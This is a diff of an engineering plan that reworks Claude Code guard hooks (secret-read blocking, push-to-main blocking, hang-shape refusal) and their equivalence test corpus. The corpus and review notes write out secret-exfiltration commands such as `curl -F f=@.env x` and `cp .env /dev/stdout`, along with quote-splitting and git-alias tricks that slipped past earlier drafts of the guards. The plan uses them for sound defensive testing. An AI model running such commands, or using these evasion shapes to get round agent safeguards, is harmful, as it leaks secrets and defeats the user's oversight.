@@ -28,7 +28,9 @@ Under both forms, the old wrapper's "exit 127 → exit 2" mapping moves **into**
 - **Fixture blocks.** `# ---- v4.4.0 C<n>: <title>` … `# ---- end v4.4.0 C<n>`. Insert each one immediately before the final tally line `echo "----------------------------------------------------------------"` of `scripts/test-hooks.sh`, after the last `# ---- end v4.3.2 …` block. The harness pulls in lines 1–50 and every top-level function defined before line 400 (`mkrepo`, `mkjson`, `jesc`, `check`, `check_msg`, `check_nomsg`, `expect`, `skip`, …). Define anything else inside the block.
 - **Block harness.** Reuse v4.3.2's `run-block.sh` and `run-in.sh` (v4.3.2 plan, Global Constraints). Copy them into `$WT/.superpowers/sdd/2026-10-04-hook-slimming/` and set the default `VER` to `v4.4.0`. `RB <block>` runs one block; `RI <cmd>` runs a repo script.
 - **Full consistency run** = `RI bash scripts/verify-template-consistency.sh` (timeout 600000). The last line must be `ALL CHECKS PASSED`.
-- **Equivalence run** = `RI bash scripts/hook-equivalence.sh` (Task 1). The last line must be `EQUIVALENCE: 0 decision changes`. Run it at the end of every task from Task 2 on.
+- **Equivalence run** = `RI bash scripts/hook-equivalence.sh --config full`, launched with `run_in_background` (Task 1 measures its duration and records it in the fixture README). The last line must be `EQUIVALENCE: 0 decision changes`. Run it at the end of every task from Task 2 on.
+  - **All three configurations** (`--config python3` and `--config jq` as two more background runs, one at a time) are required at Tasks 4, 7, 10 and 13.
+  - If one run would exceed a 600000 ms call, chunk it with `--only '<id-glob>'` and run the chunks in turn.
 - **New check numbers.** The highest check on `feat/v4.3.2` is 64 (`# Check 64`). The numbers are reserved: 65 for v4.4 (Jev), 66–68 for v4.5, and 69 for v4.3.2 P (pre-push). This plan uses **70** (Task 9, doctor) and **71** (Task 10, registration polarity). Before writing either one, run `grep -n '^# Check 7[01]' scripts/verify-template-consistency.sh`; it must print nothing, and the controller confirms the numbers.
 
 ## The polarity table (binding; every task preserves it)
@@ -47,14 +49,26 @@ These are today's registrations, with what each does when the script is missing 
 | `verify-hooks` (new, Task 9) | templates, user | — | `U` / `UU` | non-blocking |
 | UserPromptSubmit `date`, PreCompact `echo` | user, templates | inline | **unchanged** (check 62 pins the date hook) | — |
 
-**Allow hooks.** No allow hook ships today. `allow-ctx-plan.sh` was removed in v2.0 PR3 (`settings-reference.md`). Check 71 records the rule anyway: a hook that can emit `permissionDecision: "allow"` is registered `U`/`UU`, never `F`/`UF`, because a 127-to-2 wrap would turn its absence into a block. The stop gate (`enforce-agent-contract`) stays `U`.
+**Allow hooks.**
+- `allow-ctx-plan.sh` was removed in v2.0 PR3 (`settings-reference.md`).
+- `read-size-gate.sh` **can** emit `permissionDecision: "allow"`: its embedded JS writes the key unquoted. It is registered `W` (fail-open), and that does not change.
+- Check 71 records the rule: a hook that can emit an allow is never registered `F`/`UF`, because a 127-to-2 wrap would turn its absence into a block. The grep is `permissionDecision"?[[:space:]]*:[[:space:]]*"allow"`, which matches the JS and JSON spellings.
+- The stop gate (`enforce-agent-contract`) stays `U`.
+
+**Non-blocking errors count as `allow`** (spec §2.5: a non-zero exit other than 2 lets the tool call proceed). The one accepted message-level change: a `W` hook's own exit 127 (or a missing `bash`) used to print the WARN and exit 0. Now it surfaces as a non-blocking error. The decision is the same, so the equivalence harness classes both as `allow` and annotates them (Task 1).
+
+**Row 1, precisely:**
+- The templates register all six F hooks.
+- The root `.claude/settings.json` registers only `pre-commit-test`, `no-push-main` and `gate-before-merge` (×2) as F, plus `deny-hang-shapes` and `model-floor` as O, and `post-edit-build` as U.
+- The agent frontmatter `gate-before-merge` (F) is in `coder.md`, `dotnet-coder.md` (dotnet, dotnet-maui), `java-coder.md`, `python-coder.md` and `rust-coder.md`. Task 10 lists them; `grep -l 'hooks/gate-before-merge.sh' templates/*/.claude/agents/*.md` is the census.
 
 ### Exact registration strings (copy them; checks 70/71 and the fixtures grep for them)
 
 `X` is the hook's basename without `.sh`. `<MSG>` is the hook's **current** offline phrase, kept per hook (`enforcement offline`, `secrets protection offline`, `CLAUDE.md protection offline`, `Read size gate offline`, `delegation enforcement offline`, `tool-call budget offline`). The JSON escaping shown is what goes in the file.
 
 - **F** (project fail-closed):
-  `"command": "f=\"${CLAUDE_PROJECT_DIR:-.}/hooks/X.sh\"; [ -r \"$f\" ] || { echo \"HOOK SCRIPT MISSING: $f -- <MSG>. Check that hooks/ exists at the project root.\" >&2; exit 2; }; exec bash \"$f\""`
+  `"command": "f=\"${CLAUDE_PROJECT_DIR:-.}/hooks/X.sh\"; [ -r \"$f\" ] || { echo \"HOOK SCRIPT MISSING: $f -- <MSG>. Check that hooks/ exists at the project root.\" >&2; exit 2; }; command -v bash >/dev/null 2>&1 || { echo \"HOOK BLOCKED: bash not found on PATH -- $f cannot run\" >&2; exit 2; }; exec bash \"$f\""`
+  Why the `command -v bash` test (review finding 4, verified): today, `bash x; c=$?` with no bash gives 127, which the wrapper turns into 2. A failed `exec bash` exits 127 straight away, and the `||` never runs. The test is a builtin in both dash and bash, so it adds no fork.
 - **W** (project fail-open WARN):
   `"command": "f=\"${CLAUDE_PROJECT_DIR:-.}/hooks/X.sh\"; [ -r \"$f\" ] || { echo \"WARN: $f missing -- <MSG>. Check that hooks/ exists at the project root.\" >&2; exit 0; }; exec bash \"$f\""`
 - **O** (project fail-open silent):
@@ -64,14 +78,18 @@ These are today's registrations, with what each does when the script is missing 
 - **User-level** (exec form). In `user-level-reference/settings.json` the program is the literal token `@BASH@` and the hook directory is `@HOOKS@`. `render-user-hooks.sh` substitutes both (Task 8):
   `{"type": "command", "command": "@BASH@", "args": ["-c", "<SA_X><TAIL>", "@HOOKS@/X.sh"]}`
   - `<SA_X>` (C5 step-aside; empty for `verify-hooks`, which has its own rule, see Task 9):
-    `p=${CLAUDE_PROJECT_DIR:-.}; if [ -f \"$p/hooks/X.sh\" ] && [ -r \"$p/.claude/settings.json\" ]; then IFS= read -r -d '' s < \"$p/.claude/settings.json\"; case $s in *'}/hooks/X.sh'*) exit 0 ;; esac; fi; unset p s; `
+    `p=${CLAUDE_PROJECT_DIR:-.}; if [ -f \"$p/hooks/X.sh\" ] && [ -r \"$p/.claude/settings.json\" ]; then IFS= read -r -d '' s < \"$p/.claude/settings.json\"; case $s in *'}/hooks/X.sh\\\"'*) exit 0 ;; esac; fi; unset p s; `
+    After JSON decoding, the bash pattern is `*'}/hooks/X.sh\"'*`. That is the literal text `}/hooks/X.sh\"` as it appears in the project's raw `settings.json`, where a JSON-escaped quote closes the path.
   - `<TAIL>` for **UF**: `[ -r \"$0\" ] || { echo \"HOOK SCRIPT MISSING: $0 -- <MSG>.\" >&2; exit 2; }; . \"$0\"`
   - `<TAIL>` for **UO**: `[ -r \"$0\" ] || exit 0; . \"$0\"`
   - `<TAIL>` for **UU**: `. \"$0\"`
 - **Fail-closed hook trap.** This is the first executable line, directly after the header comment, of each hook marked F/UF: `pre-commit-test`, `no-push-main`, `gate-before-merge`, `deny-secret-reads`, `deny-claude-md-writes`, `require-skills-block`.
   `trap '[ "$?" = 127 ] && exit 2' EXIT   # v4.4.0 C2: the old registration wrapper's 127->2, now in-hook (exec/source forms cannot wrap)`
 
-Why `'}/hooks/X.sh'`: the template form spells the path `${CLAUDE_PROJECT_DIR:-.}/hooks/X.sh`, so the `}` anchors the match to a **project** registration. The user-level rendered path (`…/.claude/hooks/X.sh`) cannot match it. That matters when a session's project dir is `$HOME`.
+Why `}/hooks/X.sh\"`:
+- The template form spells the path `${CLAUDE_PROJECT_DIR:-.}/hooks/X.sh`, so the `}` anchors the match to a **project** registration. The user-level rendered path (`…/.claude/hooks/X.sh`) cannot match it, which matters when a session's project dir is `$HOME`.
+- The closing `\"` (review finding 6, reproduced) rejects a permissions entry `Bash(bash ${CLAUDE_PROJECT_DIR}/hooks/X.sh)` and a renamed `…/hooks/X.sh.disabled`. Without it, both would make the global step aside while nothing project-side runs.
+- Every F/W/O/U string and the pre-v4.4 wrapper form have `\"` directly after `.sh`. Under D1(b) the text would be `X.sh"` (no backslash), so the pattern would change with it.
 
 ## Decisions needed (the user decides; the plan proceeds on the recommendation)
 
@@ -89,7 +107,7 @@ Why `'}/hooks/X.sh'`: the template form spells the path `${CLAUDE_PROJECT_DIR:-.
 - **R-1 (amendment, exit codes).** Probe P1 shows that `bash -c '[ -r "$0" ] || …; . "$0"' x.sh` gives the same exit code as `bash x.sh` for `exit 0/2/7`, a falling-through failing command, an `exit` inside a function, a syntax error (2 in both cases), stdin of 200 kB, `$0`/`BASH_SOURCE`/`dirname "$0"`/lib sourcing, `set -euo pipefail` with a trap, and functions. **Two differences:** (i) a top-level `return` ends a sourced script with its status, while `bash x.sh` prints an error and continues; (ii) a `set -u` abort exits 127 under `-c` and 1 as a script. Task 2 proves that neither shape exists in a registered hook. Check 71 then pins "no top-level `return`" for the hooks that are sourced (user-level `UF`/`UO`/`UU`). (ii) only affects `set -u` hooks (`agent-budget-warn`, `post-edit-build`, `retro-*`). None is sourced: they are project-only `W`/`U` and run through `exec bash`. So the `exec bash "$0"` fallback is not needed.
 - **R-2 (the 127 mapping).** The old wrapper turned **any** 127 into a block. That includes a hook whose last command was not found, not only a missing script. Neither new form can wrap the script's exit, so the mapping moves into the hook as an EXIT trap. Probe P1-g shows it reproduces the old wrapper for six shapes. No registered hook sets an EXIT trap (`pre-commit-test` traps only `TERM INT HUP`; `run-gate.sh`'s EXIT trap is not a registered hook), and check 71 pins that. A `$(…)` subshell does not inherit the trap (P1-g, row 5).
 - **R-3 (C3 is partly shipped).** v4.3.1 S6b already gave the three git gates one parser run (`json_payload`, through `gc_read_stdin`). Phase C generalises it (`json_fields`) and converts the hooks that still spawn 3–5 runs (P1 count: `deny-secret-reads` 4 node, `deny-hang-shapes` 4, plus `model-floor`, `require-skills-block` and `deny-claude-md-writes`). The node-only hooks (`bash-output-guard`, `enforce-delegation`, `read-size-gate`, `retro-*`, `enforce-agent-contract`) keep `json_require_node`. Their saving is C4's early exit, not C3.
-- **R-4 (C4 placement).** Early exits that run **before** parsing are allowed only in hooks whose unparseable-payload branch already exits 0 (`deny-hang-shapes`, `bash-output-guard`). In a fail-closed hook, an invalid payload must still block, so its early exit runs **after** the one parser call and before the expensive library or pipelines (`no-push-main`, `gate-before-merge`, `deny-secret-reads`). `pre-commit-test`'s fast path belongs to v4.3.2 F1/F2 and is **not** touched here.
+- **R-4 (C4 placement).** An early exit that runs **before** parsing is allowed only in a hook whose unparseable-payload branch already exits 0. Only `bash-output-guard` uses one, a byte-length bound. `deny-hang-shapes` tests its decoded command after its one parse, because raw-payload text is useless on Windows (`\\` in every `cwd`). Every early exit tests text **after the same quote stripping the slow path applies**, never before it (review findings 1–2). In a fail-closed hook, an invalid payload must still block, so its early exit runs **after** the one parser call and before the expensive library or pipelines (`no-push-main`, `gate-before-merge`, `deny-secret-reads`). `pre-commit-test`'s fast path belongs to v4.3.2 F1/F2 and is **not** touched here.
 - **R-5 (sync server).** `server/src/template_sync` treats `.claude/settings.json` as a whole-file template blob (`v3.apply_file_v3`, template branch: a wholesale write, and a LOCAL_EDITED file is backed up first; `mcp._three_way_merge`: line-level, JSON-unaware). No hook-aware merge exists, so a changed `command` string reaches consumers as a replacement and never as a duplicate. The risk is the reverse: a template that **drops** a matcher group silently removes that gate from every consumer. Check 71 freezes the (event, matcher, script, form) set of every registration, so a removal goes red. Task 11 adds server tests for the replacement and the three-way paths. The sync-template skill extracts hook paths by **path** (its rule 1b), so it is form-agnostic.
 
 ## Review Focus
@@ -123,22 +141,24 @@ Why `'}/hooks/X.sh'`: the template form spells the path `${CLAUDE_PROJECT_DIR:-.
 - Exec form: `"<command>" "<args>…"`, with `${CLAUDE_PROJECT_DIR}` substituted as a plain string and `@BASH@`/`@HOOKS@` rendered as Task 8 renders them.
 
 Each payload's results are merged the way Claude Code merges them: deny > ask > context > allow.
-- **Decision class:** `deny` (exit 2, or JSON `permissionDecision: "deny"` / `decision: "block"`); `ask`; `context` (exit 0 with `additionalContext` or other non-empty stdout on PostToolUse/SessionStart); `error` (another non-zero exit); `allow`.
+- **Decision class:** `deny` (exit 2, or JSON `permissionDecision: "deny"` / `decision: "block"`); `ask`; `context` (exit 0 with `additionalContext` or other non-empty stdout on PostToolUse/SessionStart); `allow` (exit 0, or any non-zero exit other than 2, which is a non-blocking error per spec §2.5). The non-zero `allow` is annotated `allow*` and printed as a `NOTE` when old and new differ only in that annotation. It never counts as a decision change.
 - **Reason category:** the **set** of hook names that denied. It is a set because C5 removes duplicate runs. Each name is the first token after `BLOCKED: `/`HOOK SCRIPT MISSING: `, normalised to the hook basename.
 
 **Scenarios** (each payload runs in all three):
 - **S1, plain project:** `CLAUDE_PROJECT_DIR` is a temp git repo with no `hooks/`; user-level hooks only.
 - **S2, toolkit project:** a temp project bootstrapped by `setup-project.sh --variant general`, plus user-level hooks.
-- **S3, this repo:** the repo's own root `.claude/settings.json`, which registers only some hooks. This is the C5 bypass fixture.
+- **S3, this repo's registration shape:** a temp git project holding a copy of this repo's root `.claude/settings.json` and `hooks/`, which registers only some hooks. This is the C5 bypass fixture. It is never this checkout itself.
+
+**No real suites run.** In S2 and S3 the temp project's `PROJECT_CONTEXT.md` sets `- **Test**: \`true\`` and `- **Gate**: \`true\``, so the commit rows exercise `pre-commit-test` without running the consistency script per row. The payload `cwd` is always the temp project, never `$WT`.
 
 **Parser configurations:** `full`, `python3-only`, `jq-only`. The hooks run with `PATH` restricted the way `scripts/test-hooks-parser-matrix.sh` restricts it (reuse its shim-directory function by copying the function body; do not source the matrix script). The harness itself uses python3 to read `settings.json`, outside the restricted PATH.
 
 **Missing-script rows** run each scenario once more with every **protection** script renamed away (old and new alike). They prove that F/UF blocks, W/O/UO allow and U/UU give `error`, identically.
 
 - [ ] **Step 1: Corpus (≥ 80 rows; tab-separated `id<TAB>event<TAB>tool<TAB>payload-json`).** It must contain at least these rows (the ids are the contract):
-  - **Bash push and branch, 18 rows:** `git push origin main`, `git push origin HEAD:main`, `git push -f origin master`, `git push origin :main`, `git push --delete origin main`, `git -C /x push origin main`, `GIT_DIR=x git push origin main`, `git.exe push origin main`, `"git" push origin main`, `cd /repo && git push`, `ls; git push origin main`, `bash push.sh` (a script that pushes main, created in the scenario), `sh ./push.sh`, `. ./push.sh`, `git checkout main`, `git switch -c feature`, `git branch -D main`, `gh pr merge 1`.
+  - **Bash push and branch, 23 rows:** `git push origin main`, `git push origin HEAD:main`, `git push -f origin master`, `git push origin :main`, `git push --delete origin main`, `git -C /x push origin main`, `GIT_DIR=x git push origin main`, `git.exe push origin main`, `"git" push origin main`, `cd /repo && git push`, `ls; git push origin main`, `bash push.sh` (a script that pushes main, created in the scenario), `sh ./push.sh`, `. ./push.sh`, `ls` + newline + `. ./push.sh`, `ls;` + TAB + `. ./push.sh`, `g"i"t push origin main`, `g''it merge feature`, `git -c alias.p=push p origin main`, `git checkout main`, `git switch -c feature`, `git branch -D main`, `gh pr merge 1`.
   - **Commit and merge gate, 6 rows:** `git commit -m x`, `git merge feature`, `git pull --ff-only`, `git pull`, `git status --short`, `git log --grep=commit`.
-  - **Secret reads, 14 rows:** Bash `cat .env`, `head -1 ./.env.local`, `sed -n 1p .env.production`, `grep KEY .env`, `cp .env /dev/stdout`, `curl -F f=@.env x`, `cat .e*v`, `source .env`, `. .env`, `cat .env.example` (allowed), `cat .environment` (allowed); Read `.env`, Read `config/.env.staging`, Read `README.md`.
+  - **Secret reads, 17 rows:** Bash `cat .env`, `head -1 ./.env.local`, `sed -n 1p .env.production`, `grep KEY .env`, `cp .env /dev/stdout`, `curl -F f=@.env x`, `cat .e*v`, `cat .'e'nv`, `cat '.'"e"nv`, `cat ."e"nv`, `source .env`, `. .env`, `cat .env.example` (allowed), `cat .environment` (allowed); Read `.env`, Read `config/.env.staging`, Read `README.md`.
   - **Hang shapes, 8 rows:** `cat > f.txt <<EOF`…, `cat <<'EOF' > f`, `git commit -F- <<EOF` (allowed), `while true; do sleep 5; done`, `sleep 30 && ls`, `cd /x && ls && pwd`, `cd /x && ls` (allowed), `ls <<<"x"` (allowed).
   - **PowerShell, 8 rows:** `git push origin main`, `& git push origin main`, `Get-Content .env`, `gc .env`, `cat .env`, `& .\push.ps1`, `Get-ChildItem`, `git status`.
   - **Agent, 5 rows:** no model with subagent_type `general-purpose`; `model: "sonnet"`; subagent_type `Explore`; a prompt without a skills block; a prompt with one.
@@ -206,23 +226,22 @@ Each payload's results are merged the way Claude Code merges them: deny > ask > 
 - [ ] **Step 3: GREEN.** `RB C3`. Regression: every existing block that drives these five hooks (`grep -n 'deny-secret-reads\|deny-hang-shapes\|model-floor\|require-skills-block\|deny-claude-md-writes' scripts/test-hooks.sh | grep '^.*# ----'` lists the block headers). Run each named block. Then the equivalence run (all configs) and the full consistency run.
 - [ ] **Step 4: Commit** `perf(v4.4.0): C3 -- five hooks parse their payload once`.
 
-### Task 5: Builtin early exits before parsing, in the fail-open hooks (C4)
+### Task 5: Builtin early exits in the fail-open hooks (C4)
 
 **Files:** `hooks/deny-hang-shapes.sh`, `hooks/bash-output-guard.sh`; mirrors. Test: new block `C4`.
 
-**deny-hang-shapes** (advisory; it already exits 0 on any doubt, so a pre-parse exit adds no allow). Directly after the lib is sourced, replace `DH_JSON=$(cat)` with the same read, then:
+**deny-hang-shapes** (advisory: it already exits 0 on any doubt). The early exit goes **after** Task 4's one `json_fields` call, on the **decoded** command. A raw-payload test would be useless on Windows, where `cwd` and `transcript_path` always carry `\\` (review finding 11). Directly after `DH_CMD` is set and the `[ -n "$DH_CMD" ] || exit 0` line, and **before** the `cmd_join_continuations` fork, add:
 
 ```bash
-# v4.4.0 C4: every refusal needs `<<`, `sleep` or a leading `cd` in the DECODED
-# command. Without a backslash in the raw payload, decoded == raw for those
-# substrings (no \uXXXX, no \n, no continuation), so their absence here is final.
-# Over-matches on purpose: any backslash, any case of SLEEP or CD, continues.
+# v4.4.0 C4: every refusal needs `<<`, `sleep` or a leading `cd` in the command
+# after continuation joining; a backslash may hide one across a continuation, so
+# it continues too. Over-matches on purpose (any case, any position).
 shopt -s nocasematch
-case "$DH_JSON" in *'\'*|*'<<'*|*sleep*|*cd*) ;; *) exit 0 ;; esac
+case "$DH_CMD" in *'\'*|*'<<'*|*sleep*|*cd*) ;; *) shopt -u nocasematch; exit 0 ;; esac
 shopt -u nocasematch
 ```
 
-Before writing it, the implementer reads `dh_norm` and the three shape tests and confirms that every refusal path needs one of those substrings **in the decoded command**. If a fourth shape exists on the integration branch, add its literal and say so.
+Before writing it, the implementer reads `dh_norm` and the three shape tests and confirms that every refusal path needs one of those substrings in the joined command. If a fourth shape exists on the integration branch, add its literal and say so. Saving: 4 interpreter runs → 1 (Task 4), and the `cmd_join_continuations`/awk forks → 0 on a harmless command.
 
 **bash-output-guard.** Directly after `TOOL_INPUT=$(cat)`, add:
 
@@ -238,7 +257,7 @@ _bog_lc=${LC_ALL-}; LC_ALL=C; _bog_n=${#TOOL_INPUT}; LC_ALL=$_bog_lc
 (Restore `LC_ALL`: if it was unset, keep it unset. Use `${LC_ALL+x}` to tell the cases apart.) Before writing it, the implementer reads the embedded node program and confirms that the **only** stdout-producing path is the `out.length > threshold` branch, and lists the fields it measures. If the program concatenates several fields (stdout and stderr, for example), the bound still holds, because all of them are inside the payload. Note it in the comment.
 
 - [ ] **Step 1: RED.** Block `C4`:
-  - Spawn-count rows: `deny-hang-shapes` on `ls -la` → 0 interpreter runs (today 4); `bash-output-guard` on an 11,999-char output → 0 node runs (today 2).
+  - Spawn-count rows: `deny-hang-shapes` on `ls -la` → 1 interpreter run and 0 `awk` (today 4 and 1+); `bash-output-guard` on an 11,999-char output → 0 node runs (today 2). Note in its comment and in the CHANGELOG that a small payload now skips the once-per-TMPDIR no-node WARN. The decision class is unchanged.
   - Decision rows, with the expected codes taken from the old hooks: the 8 hang-shape corpus rows, plus `SLEEP 5; while :; do :; done` and `\u003c\u003cEOF`; outputs of 12,001 chars, 6,001 emoji and 3,000 `\u00e9`.
 - [ ] **Step 2.** Implement both. Mirrors: `cp` and `cmp`.
 - [ ] **Step 3: GREEN.** `RB C4`, then the existing `deny-hang-shapes` and `bash-output-guard` blocks, then the equivalence run (all configs) and the full consistency run.
@@ -251,22 +270,24 @@ _bog_lc=${LC_ALL-}; LC_ALL=C; _bog_n=${#TOOL_INPUT}; LC_ALL=$_bog_lc
 The early exit sits **after** `json_fields` and its two BLOCKED branches (an unparseable payload still blocks). It sits **before** the `tr` token pipelines, in the `Bash|PowerShell)` arm only. The `Read)` arm is already cheap.
 
 ```bash
-# v4.4.0 C4: a Bash/PowerShell refusal needs a token dsr_is_secret accepts --
-# `.env…` or a `.e` glob (`.e*`, `.e?v`, `.[e]nv`) -- after quote stripping and
-# continuation joining. Quote stripping deletes characters, so in the RAW command
-# such a token still shows `.e`/`.E`, `.[`, `.?` or `.*`, or `env` split by
-# quotes. A backslash, `$` or backtick can build any of them, so those continue too.
+# v4.4.0 C4: a Bash/PowerShell refusal needs a token whose basename dsr_is_secret
+# accepts -- it starts `.e` (`.env…`, `.e*`, `.e?v`) -- and the hook strips quotes
+# from its tokens first (`tr -d '"'"'"`), so test the quote-stripped text:
+# `cat .'e'nv` must continue. A backslash may hide one across a continuation.
+_dsr_q=${DSR_CMD//[\"\']/}
 shopt -s nocasematch
-case "$DSR_CMD" in
-  *'.e'*|*'.['*|*'.?'*|*'.*'*|*env*|*'\'*|*'$'*|*'`'*) ;;
+case "$_dsr_q" in
+  *'.e'*|*'\'*) ;;
   *) shopt -u nocasematch; exit 0 ;;
 esac
 shopt -u nocasematch
 ```
 
+(Review finding 1: an earlier draft tested the raw text and let `cat .'e'nv`, `cat '.'"e"nv` and `cat ."e"nv` through. Today they are refused; this was reproduced. Those three are now corpus and `C4` rows.) Place it **before** `cmd_join_continuations`. The joined text only removes backslash-newline, so the backslash literal covers it.
+
 Before writing it, the implementer reads `dsr_is_secret`, `DSR_SECRET_RE`, the argument loop and every other deny path in the arm (the transmit verbs, the copy to a std stream, `source`/`.`), and lists the token shapes each one can deny. The predicate must contain a literal for each shape. If a deny path does not need a secret-shaped token, there is no early exit for it: drop the exit and report back.
 
-- [ ] **Step 1: RED.** Append to `C4`: a spawn-count row (`ls -la` via Bash → 0 `tr` runs; today 3+), and decision rows for all 14 secret corpus rows plus `cat ".e"nv`, `cat .\env`, `cat $HOME/.env`, `cat .ENV`.
+- [ ] **Step 1: RED.** Append to `C4`: a spawn-count row (`ls -la` via Bash → 0 `tr` runs; today 3+), and decision rows for all 17 secret corpus rows plus `cat ".e"nv`, `cat .\env`, `cat $HOME/.env`, `cat .ENV`, `cp '.'env /dev/stdout`, `curl -F f=@.'e'nv x`.
 - [ ] **Step 2–3.** Implement, then the GREEN runs and regressions as in Task 5.
 - [ ] **Step 4: Commit** `perf(v4.4.0): C4 -- deny-secret-reads skips its token walk when no secret shape can occur`.
 
@@ -287,15 +308,26 @@ Before writing it, the implementer reads `dsr_is_secret`, `DSR_SECRET_RE`, the a
 
 ```bash
 # v4.4.0 C4: refusal needs a git or gh word in the typed text, or in a script body
-# gc_collect_bodies reads (a runner word, or a path ending .sh/.ps1, or a lone `.`).
-# A backslash (continuation, escape) or `$`/backtick may build either, so continue.
+# gc_collect_bodies reads (a runner word, a path ending .sh/.ps1, or a `.` token).
+# GC_GIT_WORD_RE runs on quote-stripped text (gc_git_prefilter_text), so test the
+# quote-stripped command: `g"i"t merge` must continue. A backslash, `$` or a
+# backtick may build any word, so they continue too. A `.` token is any `.`
+# preceded by start/whitespace (newline and TAB included: gc_seg_raw splits on
+# newlines and gc_script_body re-splits on IFS)/; & | ( and followed by
+# whitespace or the end.
+_np_q=${JP_CMD//[\"\']/}
+_np_dot='(^|[[:space:];&|(])\.([[:space:]]|$)'
 shopt -s nocasematch
-case "$JP_CMD" in
-  *git*|*gh*|*sh*|*source*|*ps1*|*'\'*|*'$'*|*'`'*|.|.' '*|*' .'|*' . '*|*';.'*|*'&.'*|*'|.'*|*'(.'*) ;;
-  *) shopt -u nocasematch; exit 0 ;;
-esac
-shopt -u nocasematch
+if [[ $_np_q == *git* || $_np_q == *gh* || $_np_q == *sh* || $_np_q == *source* ||
+      $_np_q == *ps1* || $_np_q == *'\'* || $_np_q == *'$'* || $_np_q == *'`'* ||
+      $_np_q =~ $_np_dot ]]; then
+  shopt -u nocasematch
+else
+  shopt -u nocasematch; exit 0
+fi
 ```
+
+Review finding 2 reproduced two misses in an earlier draft: `ls`+LF+`. ./x` and `ls;`+TAB+`. ./x`, both refused today. It also found a third by reading the code: quote-split `g"i"t`. All three are rows now. The regex sits in a variable, so the bracket expression needs no escaping inside `[[ =~ ]]` (bash 3.2-safe).
 
 `gate-before-merge` adds its own verbs to the continue list, read from its classifier (`a6_classify_cmd` and its callers): at least `merge`, `pull`, `checkout`, `switch`, `rebase`, `reset`, `cherry-pick` and `gh`. Every one of them needs a `git`/`gh` word anyway; add them only if the reading shows a path that does not.
 
@@ -303,7 +335,7 @@ Before writing it, the implementer lists every recogniser in `gc_collect_bodies`
 
 - [ ] **Step 1: RED.** Append to `C4`:
   - Spawn-count rows: `ls -la` → `git-cmd.sh` not sourced. Assert it with a temp hooks copy whose `lib/git-cmd.sh` begins with `echo SOURCED >&2`, and expect no `SOURCED`. And exactly one parser run. `git status` must still be sourced.
-  - Decision rows: all 24 push/commit/merge corpus rows, both hooks, plus `GiT push origin main`, `x=1;. ./p.sh`, `(.  ./p.sh)`, `echo|sh`, `pwsh -File p.ps1`, a truncated payload (must still block: rc 1), an empty payload (block), and the no-parser configuration (block).
+  - Decision rows: all 24 push/commit/merge corpus rows, both hooks, plus `GiT push origin main`, `x=1;. ./p.sh`, `(.  ./p.sh)`, `ls`+LF+`. ./p.sh`, `ls;`+TAB+`. ./p.sh`, `g"i"t push origin main`, `g''it merge feature` (gate-before-merge), `echo|sh`, `pwsh -File p.ps1`, a truncated payload (must still block: rc 1), an empty payload (block), and the no-parser configuration (block).
 - [ ] **Step 2.** Implement `gc_read_stdin`'s pre-parsed entry first and run every existing `gc_read_stdin` fixture block. Then the two hook heads. Mirror `lib/git-cmd.sh`, `no-push-main.sh` and `gate-before-merge.sh`, then `cmp`.
 - [ ] **Step 3: GREEN.** `RB C4`. Regressions: the v4.3.1 G1–G6, S6, S6b blocks and the v4.3.2 V1 and V2 blocks (`grep -n '^# ---- v4.3.[12] ' scripts/test-hooks.sh`), every block naming `no-push-main` or `gate-before-merge`, then the equivalence run (all configs) and the full consistency run.
 - [ ] **Step 4: Commit** `perf(v4.4.0): C4 -- git gates exit before sourcing git-cmd.sh when no git, gh or script word can occur`.
@@ -315,6 +347,11 @@ Before writing it, the implementer lists every recogniser in `gc_collect_bodies`
 - Create: `scripts/render-user-hooks.sh`
 - Modify: `setup-project.sh`, `setup-project.ps1` (one *Next step* line each)
 - Test: new block `C1`
+
+**Placeholder safety (review finding 5).** `@BASH@` sits in an executable position. A reference copied by hand would spawn `@BASH@`, which is a non-blocking spawn error, so every user protection would fail open. Three guards:
+- (1) `settings-reference.md` and the README's user-level copy instructions open the hooks section with a bold line: **do not copy `hooks` by hand: run `scripts/render-user-hooks.sh --write`**.
+- (2) The consistency script's JSON placeholder census (today it matches `{{X}}` only) is widened to `@[A-Z]+@`. `user-level-reference/settings.json` is its single allowlisted file.
+- (3) `verify-hooks.sh` reports any `@[A-Z]+@` in a live settings file (Task 9), and so does the drift script.
 
 **Reference entries.** These are the UF/UO/UU strings from *Exact strings*, with `@BASH@`/`@HOOKS@`:
 - PreToolUse `Bash|PowerShell`: `no-push-main` UF.
@@ -355,7 +392,11 @@ The matchers are unchanged. UserPromptSubmit `date` is **unchanged** (check 62).
 
 **`verify-hooks.sh [--report]`.** Fail-open: a diagnostic never blocks.
 - Inputs: `$HOME/.claude/settings.json`, `$CLAUDE_PROJECT_DIR/.claude/settings.json` and `…/settings.local.json`, those that exist.
-- Collect every hook script path with one `grep -oE` per file, over-collecting by path exactly as sync-template rule 1b does: `[^"[:space:]]*hooks/[A-Za-z0-9_.-]+\.sh`. Resolve `${CLAUDE_PROJECT_DIR:-.}`, `${CLAUDE_PROJECT_DIR}`, `$HOME` and `~`. Rendered absolute paths stay as they are. Drop `hooks/run-gate.sh` (a permission pattern, not a registration).
+- Collect the paths in two ways:
+  - **Exec-form** entries: read with the `json.sh` parser chain (node → python3 → jq; with none, report `NO PARSER: exec-form entries unchecked`). For every hook object with `args`, the last arg is the script path. This handles paths with spaces (`C:/Users/A B/.claude/hooks/x.sh`).
+  - **Shell-form** `command` strings: one `grep -oE` per file, over-collecting by path as sync-template rule 1b does: `[^"[:space:]]*hooks/[A-Za-z0-9_.-]+\.sh`.
+- Resolve `${CLAUDE_PROJECT_DIR:-.}`, `${CLAUDE_PROJECT_DIR}`, `$HOME` and `~`. Drop `hooks/run-gate.sh` (a permission pattern, not a registration).
+- **Unrendered placeholders:** any `@[A-Z]+@` in a live settings file is reported as `MISSING (unrendered @…@ -- run scripts/render-user-hooks.sh --write)`. A hand-copied reference would otherwise spawn `@BASH@`, a non-blocking spawn error, and so fail every user protection open (review finding 5).
 - For each unique path: missing or unreadable → `MISSING`. Otherwise `bash -n` fails → `BROKEN`.
 - Default (SessionStart) mode: if anything is wrong, print to stdout (plain text is injected into context) one block:
   `HOOK CHECK FAILED -- <n> registered hook script(s) missing or broken:` / one line per problem / `Tell the user this in your first reply, before anything else. Protections stay fail-closed (a missing protection blocks its tool calls); fix with /sync-template or re-run scripts/render-user-hooks.sh --write.`
@@ -371,7 +412,8 @@ The matchers are unchanged. UserPromptSubmit `date` is **unchanged** (check 62).
   - A temp HOME and project with all hooks present → no output, exit 0.
   - One protection script deleted → the block names it, still exit 0, and `--report` exits 1.
